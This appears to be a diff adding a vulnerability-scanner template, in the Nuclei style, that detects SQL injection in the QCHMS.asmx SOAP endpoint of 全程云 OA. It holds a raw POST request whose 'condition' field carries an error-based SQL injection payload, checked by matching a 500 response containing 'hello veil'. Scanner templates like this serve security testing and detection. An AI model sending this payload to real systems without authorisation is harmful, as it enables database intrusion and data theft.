@@ -1,0 +1,43 @@
+id: eqcccd-QCHMS-sqli
+info:
+  name: 全程云 OA QCHMS.asmx SQL注入漏洞(VEID-2026-11106)
+  author: leadlife
+  severity: high
+  description: 全程云OA QCHMS.asmx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
+  reference: 
+    - https://mp.weixin.qq.com/s/ZMDSNOwPbwCIj8ARhG3MOQ
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: eqcccd,sqli
+
+http:
+  - raw:
+      - |
+        POST /OA/HMS/QCHMS.asmx HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "http://tempuri.org/GetProjectResumeList"
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetProjectResumeList xmlns="http://tempuri.org/">
+          <pageIndex>1</pageIndex>
+          <pageSize>20</pageSize>
+          <condition> AND 1078 IN (SELECT CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(111)+CHAR(32)+CHAR(118)+CHAR(101)+CHAR(105)+CHAR(108))</condition>
+          </GetProjectResumeList>
+        </soap:Body>
+        </soap:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'hello veil')
+        condition: and
